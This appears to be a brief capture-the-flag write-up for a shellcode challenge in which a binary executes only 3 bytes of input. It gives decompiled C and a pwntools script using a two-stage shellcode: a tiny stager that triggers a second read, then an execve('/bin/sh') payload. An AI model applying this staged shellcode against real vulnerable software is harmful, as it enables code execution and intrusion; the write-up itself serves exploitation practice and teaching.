In this challenge the main do a read with only 3 bytes:
```c
undefined8 main(void)

{
  code *shellcode;
  
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);

  shellcode = (code *)mmap((void *)0x0,0x1000,7,0x22,-1,0);
  read(0,shellcode,3);
  (*shellcode)();
  return 0;
}
```
But in GDB we can notice that just doing a "pop rdx" as first stage this will create the right envirorment for doing a read, so reading the shellcode for spawning a shell:
```python
input("stage_1")
asm_code="""
pop rdx
syscall
"""
shellcode=asm(asm_code)
r.send(shellcode)
input("stage_2")
asm_code= """
mov rdi, rsi
add rdi, 25
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
"""
shellcode = asm(asm_code)
stri=b"/bin/sh\00"
payload=b"aaa"+shellcode+b"/bin/sh\00"
r.send(payload)
```
notice that we have to put some padding before sending the stage 2 because we have to put our shellcode just after the stage 1 in order to be executed.